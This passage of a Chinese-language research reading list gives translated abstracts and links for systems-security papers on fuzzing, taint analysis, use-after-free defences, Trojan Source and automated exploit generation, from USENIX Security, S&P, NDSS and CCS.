CPU2006和CPU2017上只产生37%的运行时开销。此外，与现有技术相比，我们测量到的模糊测试吞吐量平均增加了2.87倍。最后，我们确认FloatZone在Juliet测试套件和一系列OSS-Fuzz错误上提供了与ASan相媲美的检测能力。</p>\n<p><a href=\"https://www.usenix.org/system/files/usenixsecurity23-gorter.pdf\">usenixsecurity23-gorter.pdf</a></p>\n<h3 id=\"PUMM-Preventing-Use-After-Free-Using-Execution-Unit-Partitioning\"><a href=\"#PUMM-Preventing-Use-After-Free-Using-Execution-Unit-Partitioning\" class=\"headerlink\" title=\"PUMM:Preventing Use-After-Free Using Execution Unit Partitioning\"></a><strong>PUMM:Preventing Use-After-Free Using Execution Unit Partitioning</strong></h3><p>​\t关键软件通常使用内存不安全的编程语言编写，容易受到使用释放后内存和双重释放错误的威胁。这导致了对内存分配器的提案，通过策略性地延迟内存重新分配的时间，使这类错误无法被利用。然而，现有的解决方案存在运行时和内存开销高的问题。为了寻求更好的解决方案，我们提出通过对程序进行分析来识别与处理各个任务相关的代码单元。基于这样的直觉，在运行时，不应该或者几乎不应该在不同任务之间传递数据，因此，释放的内存重新分配被延迟到当前执行单元完成之后，仅仅足够长的时间来防止使用释放后内存的利用。</p>\n<p>​\t为了证明我们设计的有效性，我们在Linux上实现了一个名为PUMM的原型系统，它包括一个离线分析器和一个在线强制执行器，通过透明地封装标准库来保护C/C++二进制文件。在我们的评估中，我们对26个程序中的40个真实世界漏洞和3,000个合成漏洞进行了测试，包括像Chakra JavaScript引擎这样的复杂多线程案例。PUMM成功地阻止了所有真实世界的攻击，并仅允许了4个合成攻击，同时将内存开销降低了52.0%并且平均运行时开销仅为2.04%。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec23summer_17-yagemann-prepub.pdf\">sec23summer_17-yagemann-prepub.pdf (usenix.org)</a></p>\n<h3 id=\"Trojan-Source-Invisible-Vulnerabilities\"><a href=\"#Trojan-Source-Invisible-Vulnerabilities\" class=\"headerlink\" title=\"Trojan Source: Invisible Vulnerabilities\"></a><strong>Trojan Source: Invisible Vulnerabilities</strong></h3><p>​\t我们提出了一种新型攻击，即对源代码进行恶意编码，使其在编译器和人眼看来有所不同。这种攻击利用文本编码标准（如 Unicode）中的微妙之处产生源代码，其标记的逻辑编码顺序与显示顺序不同，从而导致人类代码审查员无法直接感知的漏洞。我们称之为 “源代码木马 “攻击，它对第一方软件和整个行业的供应链破坏都构成了直接威胁。我们介绍了 C、C++、C#、JavaScript、Java、Rust、Go、Python SQL、Bash、Assembly 和 Solidity 中的源代码木马攻击实例。我们提出了明确的编译器级防御措施，并介绍了可在编译器升级时部署到编辑器、资源库和构建流水线中的其他缓解控制措施，以阻止这种攻击。我们记录了针对这些漏洞的全行业协同披露；由于这些漏洞影响了大多数编译器、编辑器和软件源，因此我们通过这次演习了解了不同公司、开源社区和其他利益相关者如何应对漏洞披露。</p>\n<p><a href=\"https://www.usenix.org/system/files/usenixsecurity23-boucher.pdf\">usenixsecurity23-boucher.pdf</a></p>\n<h3 id=\"Arbiter-Bridging-the-Static-and-Dynamic-Divide-in-Vulnerability-Discovery-on-Binary-Programs\"><a href=\"#Arbiter-Bridging-the-Static-and-Dynamic-Divide-in-Vulnerability-Discovery-on-Binary-Programs\" class=\"headerlink\" title=\"Arbiter: Bridging the Static and Dynamic Divide in Vulnerability Discovery on Binary Programs\"></a><strong>Arbiter: Bridging the Static and Dynamic Divide in Vulnerability Discovery on Binary Programs</strong></h3><p>尽管目前最先进的二进制程序分析方法在发现漏洞方面非常有效，但其准确性和可扩展性之间的固有权衡限制了这些方法的发展。在本文中，我们确定了一系列可帮助静态和动态漏洞检测技术的漏洞属性，提高了前者的精确性和后者的可扩展性。通过精心整合静态和动态技术，我们在真实世界的程序中大规模地检测出了表现出这些特性的漏洞。</p>\n<p>我们实施了我们的技术，在分析二进制代码方面取得了一些进展，并创建了一个名为 ARBITER 的原型。我们通过对四类常见漏洞的大规模评估，证明了我们方法的有效性： CWE-131（缓冲区大小计算错误）、CWE-252（未检查的返回值）、CWE-134（未控制的格式字符串）和 CWE-337（伪随机数生成器中的可预测种子）。我们在 Ubuntu 软件仓库中超过 76516 个 x86-64 二进制文件上评估了我们的方法，发现了新的漏洞，包括一个在编译过程中插入程序的漏洞。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec22-vadayath.pdf\">sec22-vadayath.pdf (usenix.org)</a></p>\n<h3 id=\"Fine-Grained-Dataflow-Tracking-with-Proximal-Gradients\"><a href=\"#Fine-Grained-Dataflow-Tracking-with-Proximal-Gradients\" class=\"headerlink\" title=\"Fine Grained Dataflow Tracking with Proximal Gradients\"></a><strong>Fine Grained Dataflow Tracking with Proximal Gradients</strong></h3><p>​\t使用动态污点分析（DTA）进行数据流跟踪是系统安全领域的一种重要方法，有很多应用，包括漏洞分析、引导模糊和侧信道信息泄漏检测。然而，DTA 从根本上受到污点标签布尔性质的限制，无法提供有关检测到的数据流重要性的信息，导致在复杂的真实世界程序中出现假阳性/阴性。</p>\n<p>​\t我们引入了近端梯度分析（PGA），这是一种基于理论的新方法，可以跟踪更准确、更精细的数据流信息。PGA 使用近似梯度（一种对无差异函数梯度的概括）来对程序中的无差异操作进行精确梯度组合。在程序上组合梯度消除了 DTA 中出现的许多数据流传播错误，并提供了有关每个测量数据流如何影响程序的更丰富信息。</p>\n<p>​\t我们在 7 个实际程序上将 PGA 原型实现与三种最先进的 DTA 实现进行了比较。结果表明，与污点跟踪（平均 20%）相比，PGA 可以将数据流跟踪的 F1 精确度提高 33%，而不会带来任何显著的开销（平均 &lt; 5%）。我们发现了 22 个漏洞（20 个经开发人员确认）和 2 个侧信道泄漏，并在测试程序中的 19 个现有 CVE 中识别出了可利用的数据流，从而进一步证明了 PGA 的有效性。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec21-ryan.pdf\">sec21-ryan.pdf (usenix.org)</a></p>\n<h3 id=\"maze-Towards-Automated-Heap-Feng-Shui\"><a href=\"#maze-Towards-Automated-Heap-Feng-Shui\" class=\"headerlink\" title=\"maze: Towards Automated Heap Feng Shui\"></a><strong>maze: Towards Automated Heap Feng Shui</strong></h3><p>​\t大量内存损坏漏洞，例如堆溢出和释放后使用（UAF），只能通过堆风水等技术在特定堆布局中利用。为了给自动生成漏洞利用程序（AEG）铺平道路，需要对堆布局进行自动操作。</p>\n<p>​\t在本文中，我们提出了一种新型解决方案 MAZE，用于操作概念验证 (POC) 样本的堆布局。它首先识别堆布局基元（即输入片段或代码片段），供用户操作堆。然后，它应用一种新颖的 “挖掘与填充 “算法（Dig &amp; Fill algorithm），该算法将问题建模为线性二叉方程（Linear Diophantine Equation）并进行确定性求解，从而推断出能够生成目标堆布局的基元操作序列。</p>\n<p>​\t我们在分析引擎 S2E 的基础上实现了 MAZE 的原型，并在 PHP、Python 和 Perl 解释器、一组 CTF（夺旗）程序以及大型微基准测试中对其进行了评估。结果表明，MAZE 可以为超过 90% 的程序生成预期的堆布局。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec21-wang-yan.pdf\">sec21-wang-yan.pdf (usenix.org)</a></p>\n<h3 id=\"SELECTIVETAINT-Efficient-Data-Flow-Tracking-With-Static-Binary-Rewriting\"><a href=\"#SELECTIVETAINT-Efficient-Data-Flow-Tracking-With-Static-Binary-Rewriting\" class=\"headerlink\" title=\"SELECTIVETAINT: Efficient Data Flow Tracking With Static Binary Rewriting\"></a>SELECTIVETAINT: Efficient Data Flow Tracking With Static Binary Rewriting</h3><p>污点分析已被广泛应用于许多安全应用中，如漏洞检测、信息流跟踪、恶意软件分析和协议逆向工程。最先进的污点分析工具通常建立在动态二进制仪表之上，对每一条可能的指令进行检测，并依赖运行时信息来判断特定指令是否涉及污点，因此通常会产生很高的性能开销。本文介绍了针对二进制可执行文件的高效选择性污点分析框架 SelectiveTaint。其主要思想是利用静态二进制重写代替动态二进制工具，选择性地对涉及污点分析的指令进行工具化。在高层次上，SelectiveTaint 会静态扫描二进制代码中感兴趣的污点源，利用值集分析保守地确定指令操作数是否需要污点分析，然后选择性地对感兴趣的指令进行污点分析。我们实现了 SelectiveTaint，并用一组二进制程序对其进行了评估，其中包括 16 个 coreutils（侧重于文件 I/O）和 5 个网络守护程序（侧重于网络 I/O），如 nginx 网络服务器。评估结果表明，与最先进的动态污点分析框架相比，SelectiveTaint 静态检测的二进制程序性能更优越（例如，比 libdft 快 1.7 倍）。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec21-chen-sanchuan.pdf\">sec21-chen-sanchuan.pdf (usenix.org)</a></p>\n<h3 id=\"MBA-Blast-Unveiling-and-Simplifying-Mixed-Boolean-Arithmetic-Obfuscation\"><a href=\"#MBA-Blast-Unveiling-and-Simplifying-Mixed-Boolean-Arithmetic-Obfuscation\" class=\"headerlink\" title=\"MBA-Blast: Unveiling and Simplifying Mixed Boolean-Arithmetic Obfuscation\"></a><strong>MBA-Blast: Unveiling and Simplifying Mixed Boolean-Arithmetic Obfuscation</strong></h3><p>​\t混合布尔算术 (MBA) 混淆是一种执行从简单表达式到难以理解和分析的表示的语义保留转换的方法。 更具体地说，这种混淆技术由算术运算（例如 ADD 和 IMUL）和布尔运算（例如 AND、OR 和 NOT）的混合使用组成。 经过 MBA 混淆的二进制代码可以有效地隐藏静态和动态逆向工程中的秘密数据/算法，包括利用 SMT 求解器的高级分析。 不幸的是，针对 MBA 的反混淆研究仍处于起步阶段：最先进的解决方案（例如模式匹配、位爆破和程序合成）要么遭受严重的性能损失，要么是为特定的 MBA 模式设计的，要么生成太多的代码。 在实践中会导致错误的简化。</p>\n<p>​\t在本文中，我们首先揭秘 MBA 混淆的底层机制。 我们的深入研究揭示了 1 位变量和 n 位变量之间 MBA 转换的隐藏双向特征。 我们利用这一特性并提出了一种可行的解决方案，通过 MBA 混淆来有效地反混淆代码。 我们的主要见解是 MBA 转换在 1 位和 n 位变量上的行为方式相同。 我们提供了数学证明来保证这一发现的正确性。 我们进一步开发了一种新技术，通过 1 位空间的算术缩减将 MBA 表达式简化为正常的简单形式。 我们将这个想法实现为一个名为 MBA-Blast 的开源原型，并在包含约 10,000 个 MBA 表达式的综合数据集上对其进行了评估。 我们还在现实世界的二进制代码反混淆场景中测试了我们的方法，这表明 MBA-Blast 可以帮助人类分析师充分利用 SMT 求解器的优势。 与现有工作相比，MBA-Blast 是最通用、最高效的 MBA 反混淆技术； 它具有坚实的理论基础，并且成功率最高，而开销可以忽略不计。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec21-liu-binbin.pdf\">sec21-liu-binbin.pdf (usenix.org)</a></p>\n<h3 id=\"VScape-Assessing-and-Escaping-Virtual-Call-Protections\"><a href=\"#VScape-Assessing-and-Escaping-Virtual-Call-Protections\" class=\"headerlink\" title=\"VScape: Assessing and Escaping Virtual Call Protections\"></a><strong>VScape: Assessing and Escaping Virtual Call Protections</strong></h3><p>​\t许多控制流完整性（CFI）解决方案已被提出，用于保护间接控制传递（ICT），包括C++虚函数调用。评估这些防御方案的安全性保证是重要但困难的。在实践中，对于一个（强）防御方案，通常需要大量的手工工作来评估在给定特定（弱）漏洞时是否可以被绕过。现有的自动化利用生成解决方案，用于评估漏洞的可利用性，尚未解决这个问题。</p>\n<p>​\t在本文中，我们指出了一系列不破坏C++ ABI（应用程序二进制接口）的虚函数保护方案容易受到先进的COOPLUS攻击的威胁，即使给定的漏洞很弱。然后，我们提出了一个名为VScape的解决方案，用于评估虚函数保护方案对这种攻击的有效性。我们开发了VScape的原型，并利用它评估了11个CFI解决方案和14个包含Firefox和PyQt在内的C++应用程序的已知漏洞。结果表明，现实世界的应用程序存在大量可利用的虚函数调用，并且VScape可以用于生成可绕过已部署防御方案的工作利用程序，通过利用弱漏洞实现绕过。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec21-chen-kaixiang.pdf\">sec21-chen-kaixiang.pdf (usenix.org)</a></p>\n<h3 id=\"Precise-and-Scalable-Detection-of-Use-after-Compacting-Garbage-Collection-Bugs\"><a href=\"#Precise-and-Scalable-Detection-of-Use-after-Compacting-Garbage-Collection-Bugs\" class=\"headerlink\" title=\"Precise and Scalable Detection of Use-after-Compacting-Garbage-Collection Bugs\"></a><strong>Precise and Scalable Detection of Use-after-Compacting-Garbage-Collection Bugs</strong></h3><p>​\t压缩垃圾收集(compact-gc)是一种通过重新安排活动对象和使用地址表更新其引用来提高内存利用率和减少内存碎片的方法。如果在compact-gc之后使用了未在地址表中注册的对象引用，则可能存在严重的use-after-free错误，因为活动对象可能会移动，但在compact-gc之后不会更新引用。我们将此称为use-after-compact-gc (use-after-cgc)错误。以前的工具已经尝试使用特定于目标的启发式方法静态地检测这些错误。然而，由于它们的路径不敏感分析和不精确的目标特异性启发式，它们有很高的假阳性和假阴性。</p>\n<p>​\t在本文中，我们提出了一个精确的、可扩展的静态分析器CGSan，用于查找use-after-cgc错误。CGSan通过过程内静态符号污染分析检测cgc后使用的候选错误，并通过约束不足的定向符号执行检查它们的可行性。为了减轻过程内分析的不完整性，我们采用了基于类型的污染策略。对于可扩展性，我们建议使用定向过程间控制流图，它通过排除与检查可行性无关的路径来减少搜索空间，以及定向调度，它优先考虑路径以快速检查可行性。我们在Google V8和Mozilla SpiderMonkey上评估了CGSan，我们发现了13个独特的使用后cgc错误，只有2个假阳性，而之前的两个工具遗漏了10个错误，总共有34个假阳性.</p>\n<p><a href=\"https://www.usenix.org/system/files/sec21-han-hyungseok.pdf\">sec21-han-hyungseok.pdf (usenix.org)</a></p>\n<h3 id=\"FlowDist-Multi-Staged-Refinement-Based-Dynamic-Information-Flow-Analysis-for-Distributed-Software-Systems\"><a href=\"#FlowDist-Multi-Staged-Refinement-Based-Dynamic-Information-Flow-Analysis-for-Distributed-Software-Systems\" class=\"headerlink\" title=\"FlowDist: Multi-Staged Refinement-Based Dynamic Information Flow Analysis for Distributed Software Systems\"></a><strong>FlowDist: Multi-Staged Refinement-Based Dynamic Information Flow Analysis for Distributed Software Systems</strong></h3><p>​\t动态信息流分析(DIFA)支持各种安全应用，如恶意软件分析和漏洞发现。然而，由于适用性、可移植性和可伸缩性方面的障碍，传统的DIFA方法对分布式软件的效用有限。我们提出了FlowDist，这是一个通用分布式软件的DIFA，可以克服这些挑战。FlowDist工作在纯应用程序级别，避免了平台定制，因此实现了高可移植性。它从全局部分顺序执行事件中推断出隐式的进程间依赖关系，以解决分布式软件的适用性。最重要的是，它为应用程序级DIFA引入了一种基于多阶段细化的方案，在这种方案中，通过廉价的预分析产生的方法级结果减少了昂贵的数据流分析，从而在保持有效性的同时实现了高可伸缩性。我们在12个真实的分布式系统上对FlowDist与两种同类工具进行了评估，结果显示其在实际效率和可扩展性方面具有卓越的有效性。它发现了18个已知漏洞和24个新漏洞，其中17个已确认，2个已修复。我们还提出并评估了FlowDist的两种替代设计，包括设计理由和不同的主题住宿。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec21-fu-xiaoqin.pdf\">sec21-fu-xiaoqin.pdf (usenix.org)</a></p>\n<h3 id=\"Symbolic-execution-with-SymCC-Don’t-interpret-compile\"><a href=\"#Symbolic-execution-with-SymCC-Don’t-interpret-compile\" class=\"headerlink\" title=\"Symbolic execution with SymCC: Don’t interpret, compile!\"></a><strong>Symbolic execution with SymCC: Don’t interpret, compile!</strong></h3><p>​\t实际符号执行的主要障碍是速度，特别是与模糊测试等接近本地速度的解决方案相比。我们提出了一种基于编译的符号执行方法，其性能优于最先进的实现数量级。我们介绍了SymCC，这是一个基于llvm的C和c++编译器，它将concolic执行构建到二进制文件中。它可以被软件开发人员用作clang和clang++的临时替代品，并且我们展示了如何轻松地添加对其他语言的支持。与KLEE相比，SymCC的速度快了三个数量级，平均快了12个数量级。它的性能也优于Qsym, Qsym是一个最近表现出比其他实现有很大性能改进的系统，最高可达两个数量级，平均为10倍。在真实的软件上使用它，我们发现我们的方法始终达到更高的覆盖率，并且我们在经过大量测试的OpenJPEG项目中发现了两个漏洞，这些漏洞已经被项目维护者确认并分配了CVE标识符。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec20-poeplau.pdf\">sec20-poeplau.pdf (usenix.org)</a></p>\n<h3 id=\"Everything-Old-is-New-Again-Binary-Security-of-WebAssembly\"><a href=\"#Everything-Old-is-New-Again-Binary-Security-of-WebAssembly\" class=\"headerlink\" title=\"Everything Old is New Again: Binary Security of WebAssembly\"></a><strong>Everything Old is New Again: Binary Security of WebAssembly</strong></h3><p>​\tWebAssembly是一种越来越流行的编译目标，通过严格分离代码和数据、强制类型和限制间接控制流，它被设计成在浏览器和其他平台上安全运行代码。尽管如此，内存不安全源语言中的漏洞可能会转化为WebAssembly二进制文件中的漏洞。在本文中，我们分析了WebAssembly二进制文件中的漏洞可被利用的程度，以及与本机代码的比较。我们发现许多经典的漏洞，由于常见的缓解措施，在原生二进制文件中不再被利用，在WebAssembly中完全暴露出来。此外，WebAssembly支持独特的攻击，例如覆盖假定的常量数据或使用堆栈溢出操作堆。我们提出了一组攻击原语，使攻击者能够(i)写入任意内存，(ii)覆盖敏感数据，以及(iii)通过转移控制流或操纵主机环境来触发意外行为。我们提供了一组易受攻击的概念验证应用程序以及完整的端到端漏洞，涵盖了三个WebAssembly平台。对编译到WebAssembly的实际二进制文件和SPEC CPU程序的经验风险评估表明，我们的攻击原语在实践中可能是可行的。总的来说，我们的发现显示WebAssembly中可能令人惊讶地缺乏二进制安全性。我们讨论了潜在的保护机制，以减轻由此产生的风险。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec20-lehmann.pdf\">sec20-lehmann.pdf (usenix.org)</a></p>\n<h3 id=\"AURORA-Statistical-Crash-Analysis-for-Automated-Root-Cause-Explanation\"><a href=\"#AURORA-Statistical-Crash-Analysis-for-Automated-Root-Cause-Explanation\" class=\"headerlink\" title=\"AURORA: Statistical Crash Analysis for Automated Root Cause Explanation\"></a><strong>AURORA: Statistical Crash Analysis for Automated Root Cause Explanation</strong></h3><p>​\t鉴于自动化软件测试技术的巨大成功，在实践中发现了大量的崩溃。确定崩溃的根本原因是一项耗时的工作，会导致发现崩溃和修复底层软件故障之间的不平衡。为了解决这个问题，已经提出了依赖于诸如反向执行和向后污染分析等技术的各种方法。然而，这些技术要么局限于特定的故障类型，要么向分析人员提供组装指令，但没有上下文信息或对潜在故障的解释。</p>\n<p>​\t在本文中，我们提出了一种自动化分析方法，它不仅可以识别给定二进制可执行文件的崩溃输入的根本原因，还可以为分析人员提供有关崩溃输入特征的错误行为的上下文信息。从单个崩溃输入开始，我们生成一组不同的类似输入，这些输入要么使程序崩溃，要么诱发良性行为。然后，我们在执行每个找到的输入时跟踪程序的状态，并生成谓词，即捕获崩溃和非崩溃输入之间的行为差异的简单布尔表达式。对所有谓词的统计分析使我们能够确定确定根本原因的谓词，从而不仅揭示了根本原因的位置，而且还向分析人员提供了在该位置显示的崩溃行为的解释。我们在一个叫做AURORA的工具中实现了我们的方法，并对25个不同的软件故障进行了评估。我们的评估表明，AURORA甚至能够发现复杂bug的根本原因。例如，在开发人员修复和崩溃位置之间执行了数百万条指令的情况下，它成功了。与现有方法相比，AURORA还能够处理根本原因与崩溃之间没有数据依赖关系的错误，例如类型混淆错误。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec20fall_blazytko_prepub.pdf\">sec20fall_blazytko_prepub.pdf (usenix.org)</a></p>\n<h3 id=\"KOOBE-Towards-Facilitating-Exploit-Generation-of-Kernel-Out-Of-Bounds-Write-Vulnerabilities\"><a href=\"#KOOBE-Towards-Facilitating-Exploit-Generation-of-Kernel-Out-Of-Bounds-Write-Vulnerabilities\" class=\"headerlink\" title=\"KOOBE: Towards Facilitating Exploit Generation of Kernel Out-Of-Bounds Write Vulnerabilities\"></a><strong>KOOBE: Towards Facilitating Exploit Generation of Kernel Out-Of-Bounds Write Vulnerabilities</strong></h3><p>​\t现代操作系统内核的整体性导致不断发现错误。 通常不清楚哪些错误值得修复，因为只有其中一部分可能严重到足以导致安全接管（即权限升级）。 因此，研究人员最近开始开发自动漏洞利用生成技术（针对 UAF bug）来协助 bug 分类过程。 在本文中，我们研究了 Linux 内核中的另一个顶级内存漏洞——堆中的越界（OOB）内存写入。 我们基于以下两个观察结果设计 KOOBE 来协助分析此类漏洞：(1) 令人惊讶的是，不同的 OOB 漏洞实例常常表现出广泛的功能。 (2) 内核漏洞利用本质上是多重交互的（即，漏洞利用涉及多个系统调用），这使得漏洞利用制作过程可以模块化。 具体来说，我们专注于提取 OOB 漏洞的功能，这将为后续的可利用性评估过程提供支持。 我们的系统构建在多个构建块上，包括用于发现隐藏功能的新型功能引导模糊解决方案，以及将功能组合在一起以进一步提高成功利用的可能性的方法。 在我们的评估中，我们通过详尽分析 17 个最新的 Linux 内核 OOB 漏洞（其中只有 5 个具有公开可用的漏洞）来证明 KOOBE 的适用性，其中 KOOBE 成功为其中 11 个漏洞生成了候选漏洞利用策略（包括 5 个没有公开的漏洞） 甚至分配了任何 CVE）。 随后，根据这些策略，我们能够为所有这些策略构建完全有效的漏洞利用。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec20-chen-weiteng.pdf\">sec20-chen-weiteng.pdf (usenix.org)</a></p>\n<h3 id=\"Automatic-Techniques-to-Systematically-Discover-New-Heap-Exploitation-Primitives\"><a href=\"#Automatic-Techniques-to-Systematically-Discover-New-Heap-Exploitation-Primitives\" class=\"headerlink\" title=\"Automatic Techniques to Systematically Discover New Heap Exploitation Primitives\"></a><strong>Automatic Techniques to Systematically Discover New Heap Exploitation Primitives</strong></h3><p>滥用堆分配器元数据的利用技术因其通用性（即独立于应用程序）和强大功能（即绕过现代缓解措施）而被广泛研究。然而，这些技术通常被认为是艺术，因此发现它们的方法仍然是临时的、手动的和针对特定分配器的。</p>\n<p>在本文中，我们提出了一种自动工具 ArcHeap，用于系统地发现尚未开发的堆利用原语，而不管它们的底层实现是什么。ArcHeap 的主要理念是让计算机自主探索空间，其概念类似于模糊测试，方法是指定一组现代堆分配器的常见设计和漏洞根源作为模型，并提供堆操作和攻击能力作为动作。在探索过程中，ArcHeap 会检查这些操作的组合是否有可能用于构建漏洞利用原语，如任意写入或重叠块。作为证明，ArcHeap 会生成工作 PoC，演示所发现的利用技术。</p>\n<p>我们用 ptmalloc2 和其他 10 个分配器对 ArcHeap 进行了评估，在 ptmalloc2 中发现了 5 种以前未知的利用技术，并针对 10 个分配器中的 7 个（包括注重安全的分配器 DieHarder）发现了几种利用技术。为了证明 ArcHeap 方法在其他领域的有效性，我们还研究了安全特性和利用原语是如何在不同版本的 ptmalloc2 中演变的。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec20-yun.pdf\">sec20-yun.pdf (usenix.org)</a></p>\n<h2 id=\"S-amp-P\"><a href=\"#S-amp-P\" class=\"headerlink\" title=\"S&amp;P\"></a>S&amp;P</h2><h3 id=\"Karonte-Detecting-Insecure-Multi-binary-Interactions-in-Embedded-Firmware\"><a href=\"#Karonte-Detecting-Insecure-Multi-binary-Interactions-in-Embedded-Firmware\" class=\"headerlink\" title=\"Karonte: Detecting Insecure Multi-binary Interactions in Embedded Firmware\"></a>Karonte: Detecting Insecure Multi-binary Interactions in Embedded Firmware</h3><ul>\n<li>基于污点分析的多二进制文件之间交互过程漏洞挖掘</li>\n<li><a href=\"https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9152796\">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9152796</a></li>\n</ul>\n<h3 id=\"SAVIOR-Towards-Bug-Driven-Hybrid-Testing\"><a href=\"#SAVIOR-Towards-Bug-Driven-Hybrid-Testing\" class=\"headerlink\" title=\"SAVIOR: Towards Bug-Driven Hybrid Testing\"></a>SAVIOR: Towards Bug-Driven Hybrid Testing</h3><ul>\n<li>传统的模糊测试加混合执行的方法会测试许多无意义的代码路径，SAVIOR能够推理出漏洞的可行性，筛选出更可行的程序执行路径。</li>\n<li><a href=\"https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9152682\">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9152682</a></li>\n</ul>\n<h3 id=\"Goshawk-Hunting-Memory-Corruptions-via-Structure-Aware-and-Object-Centric-Memory-Operation-Synopsis\"><a href=\"#Goshawk-Hunting-Memory-Corruptions-via-Structure-Aware-and-Object-Centric-Memory-Operation-Synopsis\" class=\"headerlink\" title=\"Goshawk: Hunting Memory Corruptions via Structure-Aware and Object-Centric Memory Operation Synopsis\"></a>Goshawk: Hunting Memory Corruptions via Structure-Aware and Object-Centric Memory Operation Synopsis</h3><ul>\n<li><p>使用自然语言处理和数据流分析等技术来对内存管理函数进行抽象，从而有效地检测定制化内存管理机制造成的内存破坏缺陷</p>\n</li>\n<li><p><a href=\"http://cybersec.ustc.edu.cn/2022/0606/c23847a557467/page.htm\">http://cybersec.ustc.edu.cn/2022/0606/c23847a557467/page.htm</a></p>\n</li>\n<li><p><a href=\"https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9833613\">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9833613</a></p>\n</li>\n</ul>\n<h3 id=\"SELECTFuzz：Efficient-Directed-Fuzzing-with-Selective-Path-Exploration\"><a href=\"#SELECTFuzz：Efficient-Directed-Fuzzing-with-Selective-Path-Exploration\" class=\"headerlink\" title=\"SELECTFuzz：Efficient Directed Fuzzing with Selective Path Exploration\"></a>SELECTFuzz：Efficient Directed Fuzzing with Selective Path Exploration</h3><ul>\n<li>能够将目标程序中的相关代码与不相关代码区分开来，这些代码不会触发目标代码中的漏洞。selectfuzz可以选择性地探索相关的程序路径，以实现高效的崩溃再现和漏洞检测。它确定了两种类型的相关代码-路径发散型代码和数据依赖型代码，它们分别捕获与目标代码的控制数据依赖关系。</li>\n<li><a href=\"https://seclab.cse.cuhk.edu.hk/papers/sp23_selectfuzz.pdf\">https://seclab.cse.cuhk.edu.hk/papers/sp23_selectfuzz.pdf</a></li>\n</ul>\n<h3 id=\"AEM-Facilitating-Cross-Version-Exploitability-Assessment-of-Linux-Kernel-Vulnerabilities\"><a href=\"#AEM-Facilitating-Cross-Version-Exploitability-Assessment-of-Linux-Kernel-Vulnerabilities\" class=\"headerlink\" title=\"AEM: Facilitating Cross-Version Exploitability Assessment of Linux Kernel Vulnerabilities\"></a>AEM: Facilitating Cross-Version Exploitability Assessment of Linux Kernel Vulnerabilities</h3><ul>\n<li>内核漏洞迁移</li>\n<li><a href=\"https://blog.wohin.me/posts/paper-aem/\">https://blog.wohin.me/posts/paper-aem/</a></li>\n</ul>\n<h2 id=\"NDSS\"><a href=\"#NDSS\" class=\"headerlink\" title=\"NDSS\"></a>NDSS</h2><h3 id=\"Towards-Automatic-and-Precise-Heap-Layout-Manipulation-for-General-Purpose-Programs\"><a href=\"#Towards-Automatic-and-Precise-Heap-Layout-Manipulation-for-General-Purpose-Programs\" class=\"headerlink\" title=\"Towards Automatic and Precise Heap Layout Manipulation for General-Purpose Programs\"></a>Towards Automatic and Precise Heap Layout Manipulation for General-Purpose Programs</h3><ul>\n<li>一种创新的解决方案，用于自动和精确地操作通用程序的堆布局</li>\n<li><a href=\"https://www.ndss-symposium.org/wp-content/uploads/2023/02/ndss2023_s232_paper.pdf\">https://www.ndss-symposium.org/wp-content/uploads/2023/02/ndss2023_s232_paper.pdf</a></li>\n</ul>\n<h2 id=\"CSS\"><a href=\"#CSS\" class=\"headerlink\" title=\"CSS\"></a>CSS</h2><h3 id=\"LibAFL-A-Framework-to-Build-Modular-and-Reusable-Fuzzers\"><a href=\"#LibAFL-A-Framework-to-Build-Modular-and-Reusable-Fuzzers\" class=\"headerlink\" title=\"LibAFL: A Framework to Build Modular and Reusable Fuzzers\"></a>LibAFL: A Framework to Build Modular and Reusable Fuzzers</h3><ul>\n<li>集成了多种常用的fuzz方案来进行</li>\n<li><a href=\"https://www.s3.eurecom.fr/docs/ccs22_fioraldi.pdf\">https://www.s3.eurecom.fr/docs/ccs22_fioraldi.pdf</a></li>\n</ul>\n<h3 id=\"Evocatio-Conjuring-Bug-Capabilities-from-a-Single-PoC\"><a href=\"#Evocatio-Conjuring-Bug-Capabilities-from-a-Single-PoC\" class=\"headerlink\" title=\"Evocatio: Conjuring Bug Capabilities from a Single PoC\"></a>Evocatio: Conjuring Bug Capabilities from a Single PoC</h3><ul>\n<li>分析触发漏洞的原因，并自动生成触发漏洞的输入</li>\n<li><a href=\"https://dl.acm.org/doi/pdf/10.1145/3548606.3560575\">https://dl.acm.org/doi/pdf/10.1145/3548606.3560575</a></li>\n</ul>\n<h3 id=\"Binary-Control-Flow-Trimming\"><a href=\"#Binary-Control-Flow-Trimming\" class=\"headerlink\" title=\"Binary Control-Flow Trimming\"></a>Binary Control-Flow Trimming</h3><ul>\n<li>提出了修剪无关代码的方法</li>\n<li><a href=\"https://dl.acm.org/doi/pdf/10.1145/3319535.3345665\">https://dl.acm.org/doi/pdf/10.1145/3319535.3345665</a></li>\n</ul>\n<h3 id=\"Gollum-Modular-and-Greybox-Exploit-Generation-for-Heap-Overflows-in-Interpreters\"><a href=\"#Gollum-Modular-and-Greybox-Exploit-Generation-for-Heap-Overflows-in-Interpreters\" class=\"headerlink\" title=\"Gollum: Modular and Greybox Exploit Generation for Heap Overflows in Interpreters\"></a>Gollum: Modular and Greybox Exploit Generation for Heap Overflows in Interpreters</h3><ul>\n<li>自动化堆溢出利用方法<ul>\n<li><a href=\"https://www.cs.ox.ac.uk/tom.melham/pub/Heelan-2019-GMG.pdf\">https://www.cs.ox.ac.uk/tom.melham/pub/Heelan-2019-GMG.pdf</a></li>\n</ul>\n</li>\n</ul>\n<h3 